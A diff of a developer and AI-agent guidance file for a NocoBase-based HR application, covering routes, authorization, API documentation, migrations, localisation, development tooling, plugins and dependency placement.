-V4-13 serves a minimal MCP endpoint of its own at `POST /api/talent/agent/mcp` (`server/routes/hr/agent-mcp.ts`, registered first in `server/routes/index.ts` because it authenticates its own bearer tokens). It accepts only the personal access tokens issued in 我的档案 · 连接 AI 助手 (hashed in `agentTokens`), never a session or an API key, and every tool is an existing AI-employee tool run as the token's user. The API Keys plugin's default configuration was not used because a key there is the owner's full session. `trainingSessions.instructorUserId` stays required: an external instructor's session keeps its organizer there and names the instructor in `instructorProfileId`.
-
-上线准备 lives in `server/providers/hr/go-live/` with its own `GoLiveProvider`, registered after `HrProvider` in `server/providers/index.ts` so the go-live work does not grow `hr/index.ts`:
-
-- 设置 · 上线准备 (`/settings/go-live`, page `talent.goLive`; seed 202610270121 grants it to hr.admin and hr.payroll) lists the twelve go-live steps from `GET /api/talent/go-live/status`, which counts the tables directly; composite `talent.goLive` · view / viewPayroll decides which steps a caller sees (payroll steps carry counts only), skip / skipPayroll marks a step 不需要 (personnelSettings row `goLive`, with the first payroll month that makes 本年个税累计期初 不需要 in January). The 个税期初 table `payrollTaxOpenings` is read only when it exists; 期初假期余额 counts balances carrying an `opening-import:` adjustment.
-- 批量开通账号并发激活链接 (员工 list, `talent.employee` · linkUser) creates accounts through the Users service (login = employee number, a random password nobody keeps), links them, and issues one-time links (`accountActivations`, SHA-256 of a 256-bit token, lifetime in the personnelSettings row `accountActivation`, default 7 days; every event in `accountActivationEvents`). Delivery is the Feishu bot when bound, else the 人事邮箱 (the stored copy drops the link), else HR copies the link once. `/activate/:token` (`auth: 'optional'`, `authz: 'skip'`) sets the password through the authentication plugin's `resetPassword` via `/api/public/activation/:token`. Accounts that `talent-service` `activationRisk` refuses (root, payroll, settings or administer grants) are never activated by link.
-
-`AppRouter` wraps required pages in `RequireSignIn` and guest pages in `GuestOnly` (`client/routing/authentication-gates.tsx`) instead of using the authentication plugin's guards directly. The plugin's guards redirect to a fixed `/login` and `/`, so a deep link opened while signed out lost its path and query. The gates carry the requested location as `/login?redirect=<path>` and return there after sign-in or registration, then render the plugin's guard. `client/routing/sign-in-return.ts` accepts only an application-internal path and rejects absolute, protocol-relative and backslash URLs, control characters and the guest pages. Keep both on upgrade until the plugin can carry a return location itself.
-
-The Settings header entry appears only when the user has an accessible page in the settings navigation, and stays visible on that page. The header reads the registered settings tree through `useClientApplication().runtime.settingsRouteTree`, reusing the application context. The Dev tools entry stays visible on its destination pages, is development-only, and must remain absent from production builds.
+## Changing the framework structure
 
 `client/routing/`, `client/layouts/`, `client/theme/`, the server entry points, the `package.json` scripts that call `nocobase`, and the tsconfigs are the scaffolding the template provides. It is still this application's own source — it shipped to the user and they may change it — but it is the part the template evolves, so an edit there is what a future upgrade has to reconcile.
 
-Prefer the mechanism the system already provides. Declare a page in `client/routes.ts` and add `navigation` when it needs a menu entry. Refine resources add no menu entries and, with no data provider registered, load nothing; pages load data through `useApiClient`. A settings page uses `authz` to restrict access; a plugin page is customized through an option or an override. Before editing the shell to add a menu, check the route and its `navigation` declaration.
+Prefer the mechanism the system already provides. Declare a page in `client/routes.ts` and add `navigation` when it needs a menu entry. Refine resources add no menu entries and, with no data provider registered, load nothing; pages load data through `useApiClient`. A page uses `authz` to restrict access; a plugin page is customized through an option or an override. Before editing the shell to add a menu, check the route and its `navigation` declaration.
 
 When the built-in mechanism genuinely cannot express what is being asked, changing this structure is a legitimate answer — not a last resort to apologize for. Do it deliberately, and leave the next agent enough to work with:
 
 - Comment what you changed and why the built-in path did not fit. On upgrade, an agent reconciling the template's version needs to know whether your change is still needed.
-- Update this file in the same change, so the guidance describes the application as it actually is. If the framework's shared guidance is wrong for every application, update the source `@nocobase/app-skills` package instead of editing its synchronized copy.
-
-## Building a feature
-
-### Pages and routes
-
-Declare the route in `client/routes.ts` and keep the page component behind a lazy `componentLoader`. The loaded module must default-export the component.
-
-```ts
-const appRoutes: AppClientRouteContribution = defineAppRoutes([
-  {
-    name: 'orders',
-    path: '/orders',
-    auth: 'required',
-    authz: { resource: { type: 'page', id: 'orders' }, action: 'access' },
-    componentLoader: () => import('./pages/orders.js'),
-  },
-]);
-```
-
-Route paths are application-internal. Never write the deployment base path such as `/main` into one — the runtime restores it.
-
-`auth` controls browser navigation only: `required` for signed-in pages, `guest` for sign-in and registration, `optional` for pages that work either way. It is not server security. An endpoint the page calls enforces its own authentication independently.
-
-Use `defineSettingsRoutes()` for administrative pages, which mount under `/settings`, and `defineDevRoutes()` for development-only pages, which mount under `/dev` and are absent from a production build. Do not repeat `/settings` or `/dev` in the path. `defineDevRoutes()` is a build boundary, not a permission boundary: a page that must be restricted in production is a settings route with `authz`, enforced by the server.
-
-**Declare navigation on the route.** App, Settings and Dev menus read `navigation: { title: 'navigation.orders' }`; titles resolve in the owning locale namespace. Add the translation in `client/locales/`. Refine resources do not add menu entries.
-
-Use recursive groups to organize menus; their path is optional. Pages may also have children, but must manually render `Outlet`. For URL-addressable dialogs and drawers, declare the child in `defineAppRoutes()` in `client/routes.ts`, place the owning page's `Outlet`, then render `RouteDialog` or `RouteDrawer`. A child page of its own — a record's page, a form too long for a dialog — returns `RouteChildPage` around its `PageContainer`; only tab content renders inline, and a child route that returns a bare `PageContainer` renders below the parent's content instead of covering it. Call `useRouteOverlay()` only from a descendant rendered inside the overlay, including its footer, never from the page returning the wrapper. A record opens over the page the user is on: a dashboard or a board that shows records declares their drawer under its own route instead of linking to the list's, and a row menu's Edit opens its own dialog rather than the one stacked on the drawer. On a page with tabs the user is on the tab being shown: an overlay the page's header opens is declared under every tab and linked through the current tab (`` `${tab}/edit` ``, never a bare `edit`, which resolves beside the tabs), so it stacks on that tab and closing returns to it. Read `.agents/skills/nocobase-app-development/references/frontend/references/overlay.md` before implementing overlays or close guards.
-
-Declare `authz` on the first page of every path: `{ resource: { type: 'page', id: 'orders' }, action: 'access' }` for a product page, the page's `settings` item for a settings page, `'unrestricted'` for a page only root may open, or `'skip'`. A nested page that omits it inherits its nearest ancestor page's value, and a child's own value overrides it. A first page that omits it still registers, with a development warning: protected App and settings pages become unrestricted-only, which hides them from everyone but root, while guest, optional and dev pages skip the check. Always declare it rather than relying on that default. Parent guards still apply when a child skips. Menus and loaders read the declared rule; endpoints enforce authorization independently. The page id identifies stored page grants, so changing it requires migrating the grants that reference it.
-
-### Components and styling
-
-Use shadcn/ui for UI. Check `client/components/ui/` first; if the primitive is not there, add it from the shadcn registry rather than writing your own. `yes n |` answers "no" when the CLI offers to overwrite a primitive that is already installed; without an answer, a non-interactive run stops at that question. Format the files it created and translate the English a few primitives carry, as `.agents/skills/nocobase-app-development/references/frontend/references/shadcn.md` lists; otherwise keep them as the CLI writes them:
-
-```bash
-yes n | pnpm exec shadcn add card
-pnpm exec prettier --write client/components/ui/card.tsx
-```
-
-Since template 1.0.0-beta.54 the template ships only the primitives its shell uses. The other primitives under `client/components/ui/` that NocoHR pages use (accordion, alert-dialog, badge, calendar, card, chart, select, table and the rest) stayed when the application moved to that template; they are now this application's to keep, like everything added later.
-
-Build your own components by composing these primitives, and put them in `client/components/`. A page below another one — a covering child page, a record's own page — leaves by `BackButton` (`client/components/back-button.tsx`) above its heading; `Breadcrumbs` replaces it only when the user asks for breadcrumbs. `DataTable` with `DataTableColumnHeader` and `DataTablePagination` in `client/components/data-table*.tsx` came with the earlier template and are kept as this application's own; reach for them before writing a table from scratch. For a new date field, `yes n | pnpm exec shadcn add @nocobase/date-picker` (or `@nocobase/date-time-picker`).
-
-`PageContainer`, `PageHeader`, `RouteDialog`, `RouteDrawer`, `RouteChildPage`, `useRouteOverlay` and `BackButton` in `client/components/` come from the NocoBase UI Library, as do the authentication blocks in `client/extensions/nocobase-auth-forms/`, `nocobase-auth-methods/` and `nocobase-auth-split-layout/` that `client/pages/auth/` composes; like the rest of the source, they belong to the application. `yes n | pnpm exec shadcn add @nocobase/<item>` adds another item from the library: a single component lands in `client/components/`, a complete feature in `client/extensions/nocobase-<item>/`. The CLI adds the packages an item needs to `dependencies`: move the new ones, such as `@tanstack/react-table`, to `devDependencies`, as "Adding a dependency" below explains for everything client code imports, but leave `@nocobase/i18n` in `dependencies`, where the server needs it, and put back the `^` of its range, which the CLI pins.
-
-**Look components up in the shadcn skill.** The development Skill carries the shadcn/ui skill in `.agents/skills/nocobase-app-development/references/frontend/shadcn/`. Read `references/frontend/references/shadcn.md` first: it routes to the skill's rules and states where this application departs from them, among others `pnpm exec shadcn` instead of `npx shadcn@latest` and no `shadcn apply` or `--preset`. `pnpm exec shadcn docs <name>` gives one primitive's documentation and examples for the Base UI version. For a whole page, start from the worked example that `references/frontend/references/example.md` indexes, and match the NocoHR pages around it: many of them use a `Sheet` for detail and create flows, which stays the application's convention where it already is.
-
-Style with the semantic Tailwind tokens — `bg-background`, `text-foreground`, `text-muted-foreground`, `border-border`, `bg-primary` — so pages follow the light and dark themes. Do not hard-code colors like `bg-white` or `text-gray-900`; they break the moment someone switches theme.
-
-**This application's look.** Compact and Spacious share a modern SaaS palette in `client/theme/themes/*.css`: cool neutral surfaces, an indigo `--primary` used only for actions, focus and charts, a neutral selected pill in the sidebar, soft layered shadows, and Inter (`@fontsource-variable/inter`, imported in `client/index.tsx`) for Latin text with Chinese system fallbacks. Dark mode pairs a lighter indigo with dark text to keep 4.5:1 contrast. Change these tokens, never individual pages, to adjust the look.
-
-**Visual consistency is a whole-application property.** Match the surrounding code's spacing, typography, and component choices. If a change genuinely calls for a different look, change the application's design tokens in `client/theme/themes/*.css` so every page moves together. Never restyle only the part you are working on — a page that looks different from the rest is a defect, not a customization.
-
-### Server routes
-
-`defineApiRoutes()` mounts under `/api`, and `defineRootRoutes()` mounts at the root for callbacks and webhooks. Do not repeat `/api` in the path. Each route factory creates and returns its own Hono router.
-
-```ts
-export const apiRoutes: AppApiRouteContribution<Application> = defineApiRoutes(
-  (app) => {
-    const router = new Hono();
-    const auth = app.container.resolve(authenticationToken);
-
-    router.use('/orders', auth.required());
-    router.get(
-      '/orders',
-      describeRoute({
-        tags: ['Orders'],
-        summary: 'List orders',
-        operationId: 'listOrders',
-        responses: {
-          '200': listResponse(OrderSchema),
-          // A session but no permission check; the query validator adds the 400.
-          '401': apiErrorResponse(401),
-          '500': apiErrorResponse(500),
-        },
-      }),
-      apiValidator('query', ListOrdersQuery),
-      async (context) =>
-        context.json(await listOrders(context.req.valid('query'))),
-    );
-
-    return router;
-  },
-);
-```
-
-**Every `/api` route follows the HTTP API design** in `.agents/skills/nocobase-app-development/references/http-api.md`: camelCase paths, `{ data }` on success, `throw new ApiError(...)` from `@nocobase/app-server/router` on failure, input validated with zod through `apiValidator()`, and a `describeRoute()` declaration for the API document, all from `@nocobase/app-server/router`. Never write an error body by hand.
-
-NocoHR's own routes under `server/routes/hr/` predate this design: they answer failures as `{ code, message, details }` through `installErrorHandler` in `server/routes/hr/shared.ts`, and are not yet declared with `describeRoute()`, so the API document lists them without their schemas. `responseCode()` in `client/components/talent/errors.ts` reads both that `code` and the standard body's `reason` (`ApiClientError.reason` since `@nocobase/api-client` 1.0.0-beta.3, which dropped `code`). Keep one shape per router: a route added to that router follows its shape until the router moves to the HTTP API design as a whole.
-
-**Every route owns its own security.** Mounting under `/api` does not authenticate anything. Install `auth.required()` on the paths the route owns, and add `authorization.middleware()` with an explicit `resource`/`action` check when the operation needs permission rather than just identity. Never rely on middleware from another route or on the order routes happen to be registered in.
-
-Scope middleware to the exact paths you own, or to an isolated sub-router mounted at your prefix. A `router.use('*', ...)` leaks into contributions mounted later.
-
-A webhook that a third party calls cannot use a login session, so it is deliberately public — but public still means verifying a signature, timestamp, or one-time state, and testing that anonymous requests without a valid signature are rejected.
-
-Keep HTTP concerns in the route and domain logic in a service under `server/providers/`. Services do not read Hono contexts, return HTTP status codes, or decide retry behavior.
-
-Bind services to their existing tokens in a provider's `register()`; calling `createServiceToken` twice with the same name creates different keys. Do not connect to databases, start workers, or execute route factories at module top level. Acquire long-lived resources in `start()` and release them in `shutdown()`. Providers and routes read typed configuration rather than `process.env`.
-
-### API documentation
-
-The running application serves an OpenAPI 3.1 document of every `/api` route it has — its own, every registered plugin's, the data endpoints and Better Auth's `/api/auth/...` — at `<origin><APP_BASE_PATH>/api/swagger` (JSON), with Swagger UI at `<origin><APP_BASE_PATH>/api/swagger/docs`. Locally that is `http://127.0.0.1:13000/main/api/swagger/docs`, with `/main` replaced by the actual `APP_BASE_PATH`.
-
-Reading either needs a signed-in session or an API key: open the Swagger UI in a browser where you are signed in, or send a key in `x-api-key`. A user creates keys at `<APP_BASE_PATH>/settings/api-keys`; the `nocobase-app-plugin-api-keys` Skill covers the plugin. Without a valid credential the routes answer `401` with reason `API_DOCS_UNAUTHENTICATED`, and an application with no access check registered, such as one without the authentication plugin, answers `404`.
-
-```bash
-curl -H "x-api-key: <key>" http://127.0.0.1:13000/main/api/swagger
-```
-
-**Learn the available endpoints from this document instead of reading route sources.** Before calling an endpoint or building on one, fetch the JSON with a key the user gives you and find the operations by `tags` or `operationId`; read the source only for what the document does not say. Fetch it again after registering a plugin or changing a Collection.
-
-Every `/api` route the application writes declares itself, as in the example above: `tags`, an English `summary` and a unique camelCase `operationId`; input through `apiValidator()`; responses through `dataResponse()`, `listResponse()`, `emptyResponse()` and `apiErrorResponse(status)` for exactly the statuses the route can produce. Do not list `400` for input validation: a route that uses `apiValidator` gets the `400` automatically. List `400` yourself only for another reason, such as a failed precondition. `apiErrorResponses` is `401`, `403` and `500`, for an authenticated route with a permission check; otherwise list each status the route can return with `apiErrorResponse(code)`. Response schemas live in `server/routes/schemas.ts`, typed against what the service returns. A route reached without a credential adds `security: []`. Hide a route with `describeRoute({ hide: true })` and a comment only for the few reasons `references/http-api.md` lists. Data endpoints are documented without a declaration; a field a data exposure adds to every record goes in its `computedFields`. A test starting the application expects `findUndeclaredApiRoutes()` and `findApiDocumentSchemaProblems()` to be empty; `.agents/skills/nocobase-app-development/references/testing.md` shows it.
-
-### Database
-
-Schema changes are migrations under `database/main/migrations/`. Data the application requires to run is a seed under `database/main/seeds/`. Seeds never create structure.
-
-Declare database defaults with `export default defineAppDatabaseConfig((runtime) => ({ connections }))`. Before provider registration, the runtime asynchronously imports configured official drivers; explicit `drivers` registrations override them. Keep `isolatedDeclarations: false` for application server declarations so configuration and connection fields retain inference. See `.agents/skills/nocobase-app-development/references/database-connections.md`.
-
-`database/<connection>/collections/` holds what the database currently resolves each Collection to — `collection.json`, `metadata.json` and `schema.json` per Collection plus a `_manifest.json` — written by `pnpm nocobase collections generate`, which `db apply`, `db redo`, `db rollback`, `db reset` and `pnpm dev` run for every connection whose migrations they change. Every file there is derived, for every connection: the directory is gitignored, safe to delete, and never read back. Edit metadata through migrations or the Collection Metadata Service and regenerate, never by hand, and never import these files from a migration. An `external` connection, if you add one, takes its hand-written metadata from `database/<connection>/metadata/<name>.json` instead, which is committed. `pnpm nocobase collections generate --check` fails when they are out of date.
-
-```ts
-const migration: MigrationDefinition = defineMigration({
-  name: '202609020001_create_orders',
-  async up({ builder }) {
-    await builder.createCollection('orders', (collection) => {
-      collection.increments('id');
-      collection.string('reference', { length: 64, nullable: false });
-      collection.datetime('createdAt', { nullable: false });
-    });
-  },
-  async down({ builder }) {
-    await builder.dropCollection('orders');
-  },
-});
-```
-
-**A migration is immutable history and must be self-contained.** Spell out every field, index, and constraint in the migration itself. Never import a collection definition, model, or registry that keeps evolving — doing so silently changes what an already-applied migration means. Write `down` as the explicit reverse in a safe dependency order.
-
-Edit an existing migration only while the branch that introduced it is unmerged. Once merged, every correction is a new migration. Editing one that has already run changes nothing on its own: it is recorded as executed, so `pnpm nocobase db apply` skips it. Run `pnpm nocobase db redo` to roll the latest batch back and apply it again from the corrected source. Editing it also makes its recorded checksum stop matching; a run reports that as a warning and keeps going, `onChecksumMismatch: 'error'` makes it refuse, and `pnpm nocobase db repair` realigns the history for a change that leaves the schema identical — a reformat or a comment — never for one the database has not received. `pnpm nocobase db reset` starts over from an empty schema when the batch cannot be rolled back, and takes every row with it.
-
-The exported `name` must match the filename. Apply with `pnpm nocobase db apply` and verify against a real database.
-
-Name every index you create (`c.index([...], { name })`) and drop it by that name in `down`. An unnamed index is called `idx_<table>_<column>`. `202610200001_candidate_deletion_requests` once dropped `candidates_deletion_token_hash_index` in its `down`, a name that never existed; with the user's approval its `down` was corrected on 2026-10-07 to drop `idx_candidates_deletion_token_hash` (`tests/logic/candidate-deletion-schema.test.ts`). A database that ran it before then reports a checksum mismatch: run `pnpm nocobase db repair` once, since the schema is unchanged.
-
-At runtime, resolve `databaseManagerToken` from the container and use `database.query()` to read and write the default connection. Use `database.query('analytics')` for another connection. Application tasks use `database/<connectionName>/{migrations,seeds}` and bind to that connection explicitly; plugin tasks and default runtime access stay on `database.default`. Only managed connections run migrations or seeds. See the migrations reference for execution and upgrade rules.
-
-### User-facing text
-
-Every string a user reads goes through a translation key. `client/locales/en-US.ts` states the wording and derives the shape that other locales are checked against, so a missing key in `zh-CN.ts` is a compile error. The sign-in pages' copy lives there too, under `auth.*`: the authentication components take their text as props, which the pages in `client/pages/auth/` translate.
-
-```tsx
-const { t } = useTranslation();
-t('orders.title');
-```
-
-To reword a plugin's string, add an `overrides` block keyed by that plugin's package name in your locale file. Do not edit the plugin.
-
-The languages the application offers are its own locale files, not a configured list, and the two sides are read separately: `client/locales/` decides what the picker shows, while `server/locales/` decides which languages the server can answer in. Prefer adding a language to both when server-produced text needs translating, but a client-only language is valid: the interface switches normally and the server falls back to English with an informational notice. `pnpm nocobase locales check` reports one declared on a single side and exits nonzero until the lists align; that check does not block the runtime switch.
-
-The account menu language control in `client/layouts/components/language-switcher.tsx` uses a shadcn submenu with radio items. Render it inside `DropdownMenuContent` to preserve menu keyboard navigation and selection semantics.
-
-## Development file watching
-
-Changes to `.env` and `.env.local` (including creation, atomic replacement, and deletion) restart the full development run after its previous processes exit. The new run reloads environment files, ports, proxy settings, and startup hooks; explicit shell variables still take precedence. Use the newly printed URL if the port or base path changes. This also applies in proxy mode. `config.yml` changes restart only the local server. `NOCOBASE_STRICT_STARTUP=true` disables both automatic restarts.
-
-Changes to `package.json`, the lockfile, and the package manager's install state restart the local server once they have been quiet for a few seconds. An install writes several of them over as long as fetching and linking take, so restarting on the first write would bring the server back against a half-installed `node_modules` — and the next write would arrive while it was still shutting down, which is where the watcher escalates to SIGKILL. Waiting for quiet turns one install into one restart.
-
-One development server runs per application root; a second is refused with the first one's process id. Nothing else catches it, because the port check advances to the next free port and the duplicate then fails on the migration lock the first server holds, long before it binds anything. `NOCOBASE_DEV_ALLOW_MULTIPLE=true` starts one anyway. A run that only proxies a remote backend does not take the lock, and a lock left behind by a killed run is taken over rather than reported.
-
-`pnpm dev` also shortens the shutdown budget, through `APP_SHUTDOWN_TIMEOUT_MS`, to less than the five seconds the file watcher waits before force-killing the server. The deployment defaults — a 30 second HTTP drain behind a load balancer — would never be reached here, and a force-killed server never releases its migration lock. Set the variable explicitly to override it in either direction.
-
-Tests that start auxiliary Vite servers must use an isolated temporary `cacheDir`, including when their fixture links the application's `node_modules`. Never delete or rewrite a running development server's dependency cache. See the shared application development Skill's `references/testing.md` for cache ownership and recovery.
-
-`pnpm dev` checks native file watching before starting its children. If watcher resources are exhausted or native events are unavailable, it uses polling for client and server hot updates and disables agent annotations for that run, with a warning. An explicit `CHOKIDAR_USEPOLLING=true` selects the same mode. Configuration files use stat polling so atomic saves and newly created files restart the server without native directory watchers.
-
-Vite must exclude the application's entire `dist/` tree from development file watching. Its default exclusion covers only `dist/client`; watching the compiled server and vendored packages can cause `EMFILE` after a build. Keep the exclusion scoped to this application so linked workspace dependencies, including their `dist/` files, still receive hot updates.
-
-## Developing against another backend
-
-Do not hard-code `/main` from the examples below. It is only the fallback for an unset `APP_BASE_PATH`. Local development resolves that variable from the command-line environment, then `.env.local`, then `.env`. The remote mount path is independently supplied in `PROXY_TARGET_URL`: inspect the target application's actual public URL instead of assuming it matches the local path. For example, `APP_BASE_PATH=/local PROXY_TARGET_URL=http://127.0.0.1:13000/crm pnpm dev` forwards local `/local/api` and `/local/ws` to remote `/crm/api` and `/crm/ws`.
-
-Use `PROXY_TARGET_URL=https://backend.example.com/main pnpm dev` to run only the local Vite client against another application's API and WebSocket service. The URL is the remote application base, including its mount path, without `/api`. Open the printed Local URL. The local server and server watchers are skipped; `beforeDev` hooks still run. Requests, including writes, affect the target backend. See README.MD for path mapping and authentication requirements. Leave the variable unset for normal full-stack development.
-
-The development proxy adapts same-origin HTTP and WebSocket Origin headers to the target origin, and maps same-origin Referer paths to the target app base. Other origins remain unchanged and missing Origin headers are not added. Keep backend origin checks enabled; this adaptation belongs only to Vite development, not production deployment. Production uses `APP_PUBLIC_ORIGIN` and a reverse proxy that preserves the public Host and protocol.
-
-`APP_SERVER_PORT` selects the local application entry port: Vite in proxy development mode (default 5173), or the local backend in normal development mode (default 13000). Normal development keeps Vite's preferred port at 5173. An occupied port advances to the next available port; use the printed Local URL. This variable does not change the backend URL supplied through `PROXY_TARGET_URL`.
-
-## The command line
-
-`pnpm nocobase <topic> <command>` runs this application's CLI, the `nocobase` bin of `@nocobase/app-cli`. Only `pnpm dev`, `pnpm build`, `pnpm start` and the quality scripts are scripts; every other command goes through `pnpm nocobase`, with no script alias. `pnpm nocobase --help` lists the tree and `--help` on a command gives its flags.
-
-Before running a command, read `.agents/skills/nocobase-app-development/references/cli.md`: it maps tasks to commands, explains the data-model snapshot under `database/<connection>/collections/`, and states the flags an agent must not add on its own — `db reset`, `db rollback`, `db redo` and `db repair` refuse to run without `--force` outside a terminal, and that refusal is not something to work around.
-
-A command this application owns is a file under `cli/commands/` whose path is its name below the `app` topic: `cli/commands/sync-orders.ts` answers to `pnpm nocobase app sync-orders`. Each extends `AppCommand` from `@nocobase/app-cli`: it returns its result, throws `CommandError` on failure, and gets `--json` for free. A command that needs the application creates it with `this.withApp(async ({ app }) => …)`, which always shuts it down again; work users trigger while the application serves is a server route or a job, not a command. The `nocobase-app-development` Skill's reference on adding an application command covers the file layout, the directory names to avoid, the output contract and testing.
-
-`cli/` is compiled into `dist`, and a deployment runs the same CLI without the development commands as `node dist/cli/index.js <topic> <command>`. Change shared behavior in `@nocobase/app-cli` rather than copying it into the application; use plugin build and dev hooks for local build and development extensions.
-
-## Plugins
-
-Plugins are registered in `client/plugins.ts`, `server/plugins.ts`, and `cli/plugins.ts`. Presence in the array enables a plugin and array order is contribution order. A plugin appears in the roots matching what it ships, so a plugin with only commands is listed in `cli/plugins.ts` alone. Bulk Skills synchronization and plugin updates discover plugins from these composition roots.
-
-Since template 1.0.0-beta.54 the plugins and `@nocobase/app-cli` are pinned to exact versions in `package.json`, each the last release whose peers accept `@nocobase/app-server` 1.0.0-beta.33. Their `^` ranges would otherwise resolve to the next releases, which already require `@nocobase/app-server` 2 and fail peer resolution here. Raise them together with the framework when the application moves to a template built on app-server 2, and run `pnpm peers check` afterwards; the third-party peer warnings that remain (tiptap, stagehand, d3-dsv) predate the pins.
-
-Let `pnpm nocobase plugin register` and `pnpm nocobase plugin unregister` add and remove entries. Edit these files by hand only to reorder entries or to pass a plugin its options.
-
-Update one registered plugin with `pnpm nocobase plugin update @nocobase/app-plugin-authentication`, or omit the name to update all registered plugins. Prefer the full package name; `authentication` is also accepted as a short name. The name is a positional argument, not `--plugin`. Use `--dry-run` to preview. With pnpm, updates stay within declared version ranges; after a successful update, all registered plugin Skills are re-synchronized. See [Plugins in the README](README.MD#plugins) for examples and update scope.
-
-To customize a page a plugin owns, pass an option on its registration, add a source extension under `client/extensions/*/extension.ts`, or add an entry to `client/route-overrides.ts`. Do not redeclare the plugin's route — a duplicate `/install` is a conflict, not a customization. An override replaces only `componentLoader`; route identity, path, and auth mode stay with the plugin. One route takes one override across all three mechanisms. Authentication pages are not plugin-owned: `/login`, `/register`, `/forgot-password`, and `/reset-password` are application routes declared in `client/routes.ts`.
-
-Route overrides must stay lazy, declare a `componentEntry`, and load a default-exported component. Authentication pages in `client/pages/auth/` use relative links and the authentication plugin's `client/actions` hooks; do not call authentication endpoints directly or create a second session store.
-
-### Read a plugin's Skill before building what it already does
-
-**You are not starting from scratch.** This application ships with NocoBase packages that already solve whole categories of requirement, and packages may publish a Skill explaining how to use them. `pnpm nocobase skills sync` copies Skills from direct `@nocobase/*` dependencies and registered plugins into `.agents/skills/`. Before implementing a feature, check whether an installed and registered plugin already covers it:
-
-| The requirement sounds like                                                                       | Read the Skill for                    |
-| ------------------------------------------------------------------------------------------------- | ------------------------------------- |
-| Approvals, multi-step processes, "when X happens then Y", business rules that outlive one request | `@nocobase/app-plugin-workflow`       |
-| Email, IM, or in-app messages; notifying someone that something happened                          | `@nocobase/app-plugin-notification`   |
-| Roles, permissions, "user A may only see their own records", field-level or row-level access      | `@nocobase/app-plugin-authorization`  |
-| Sign-in, registration, sessions, password reset                                                   | `@nocobase/app-plugin-authentication` |
-| User listing, account state, password reset, and application-owned role assignment                | `@nocobase/app-plugin-users`          |
-| File upload and metadata through Repository                                                       | `@nocobase/app-plugin-file`           |
-| Translated text and language switching                                                            | `@nocobase/app-plugin-i18n`           |
-
-Run `pnpm nocobase skills sync` if `.agents/skills/` is missing or looks out of date, then read the Skill for the plugin you need. It documents that plugin's public entries, the ownership boundary, and how to verify the result — which is faster and more correct than inferring an API from its source.
-
-Building a permission system, a notification sender, or a job scheduler by hand when a registered plugin already provides one is the most expensive mistake available here. Prefer the plugin; write your own only when you have read its Skill and confirmed it genuinely does not fit.
-
-`.agents/skills/` is generated output: gitignored, and every synchronized package-owned directory is replaced wholesale on the next sync, so never edit a file there. The same sync mirrors each synchronized directory into `.claude/skills/` as a symbolic link, because Claude Code discovers skills only there; that mirror is generated and gitignored too. Put application-specific guidance in committed `AGENTS.md` files.
-
-## Removing a NocoBase dependency
-
-Before removing a direct `@nocobase/*` dependency, search application imports, Client/Server/CLI plugin registrations, routes, services, configuration, tests, and build scripts for its package name and public contracts. Migrate or delete those references first. The command below changes dependency metadata and generated Skills; it does not edit application source or configuration, so never use it to remove a capability the application still needs.
-
-Use `pnpm nocobase package remove @nocobase/example`. It invokes the application's package manager so `package.json` and the lockfile stay consistent, then deletes only synchronized Skills recorded as belonging to that package. For an `@nocobase/app-plugin-*` package it delegates to the plugin unregister workflow, removing its Client, Server, and CLI registrations together; `pnpm nocobase plugin unregister <name>` remains a supported plugin-specific entry point. Preview with `--dry-run`, and use `--json` when another tool needs structured output.
-
-After an interrupted or manual removal, first confirm the manifest no longer declares the package, then run a full `pnpm nocobase skills sync` to reconcile stale package-owned output. `package remove` may also be passed a package already absent from the manifest to clean recorded historical Skill ownership, and it must not uninstall or clean Skills owned by another package.
-
-## Adding a dependency
-
-Keep `@nocobase/db` in `dependencies` alongside the database driver. It supplies the driver's runtime peer and lets TypeScript resolve the inferred database configuration declaration through the public package name. Moving it to `devDependencies` can cause TS2883 in an installed application even while the source workspace builds successfully.
-
-Put a package your **server** code imports in `dependencies`. Put everything your **client** code imports — along with build tooling, tests, and type-only imports — in `devDependencies`.
-
-That split looks backwards until you see how the two halves are deployed. `pnpm build` bundles the client: Vite resolves every client import and inlines it into `dist/client`, so nothing has to resolve it again later. The server is not bundled. `dist/server` keeps its bare imports, and `pnpm build` generates `dist/package.json` from your `dependencies` and installs a `node_modules` next to it — that tree is what the deployed server resolves against, and `devDependencies` are not in it.
-
-So the two mistakes fail in opposite ways. A server import left in `devDependencies` works all through development and fails only on the server, with a bare `Cannot find package` naming nothing that points back here. A client package put in `dependencies` never breaks anything — it is just installed into every deployment, where the server never requires it. That one is invisible, so it accumulates: `lucide-react` and `@xyflow/react` were 44 MB of it before this rule was written down.
-
-What decides it is where the importing file lives and what the import is, not what the package is for. `import ts from 'typescript'` in `server/` is a runtime dependency even though TypeScript sounds like tooling. `import type { Config } from 'x'` is erased before anything runs, so it stays a devDependency wherever it appears. A dynamic `import()` counts — deferring the load changes when a package is needed, not whether.
-
-### Adding a dependency
-
-Which half of the application imports it decides where it goes.
-
-| The import is reached from              | Declare it in     |
-| --------------------------------------- | ----------------- |
-| `server/`, `database/`, or `cli/`       | `dependencies`    |
-| `client/`, build tooling, tests         | `devDependencies` |
-| `import type` only, wherever it appears | `devDependencies` |
-
-`dist/package.json` is generated from `dependencies` and is what a deployment installs from, so a server import declared as a devDependency resolves in every development checkout and is absent exactly once — on the deployed server. A client import needs nothing at runtime: Vite resolves and inlines it into `dist/client` at build time.
-
-A plugin's browser packages arrive by a third route and need nothing from you. Plugins declare those as peer dependencies, so installing a plugin brings one shared copy into this application, while `dist/` sets `autoInstallPeers: false` and installs none of them.
-
-`pnpm build` checks the server half: it reads every value import in `server/`, `database/`, and `cli/` and fails the build if any of those packages is missing from `dist/package.json`. It cannot see an import whose specifier is built at run time:
-
-```ts
-await import(`${name}/index.js`); // invisible to the check
-```
-
-Declare such a package in `dependencies` when you write the code; nothing will remind you later.
-
-### Packing the build for a deployment
-
-`pnpm build --tar` writes `storage/exports/dist.tar.gz` after the build. The archive holds `dist/` as a directory next to `config.example.yml`, so extracting it produces exactly those two paths rather than scattering `server/` and `node_modules/` into whatever directory you unpacked in.
-
-`config.example.yml` travels with it because a deployment has to write a `config.yml` before it can start — `pnpm nocobase config init`, run inside `dist/`, does that from the example, in place, and `pnpm nocobase config check` there verifies it, database connection included, before the first start — and the example is the only statement of what may go in it. Directories of executable shims are left out: a `.bin` entry points at a path on the machine that installed it, and a dangling one makes `pnpm install` in the extracted tree report a corrupt store rather than repair it.
-
-Without `--tar` no archive is produced, which is what you want when the build is only going to be run locally.
-
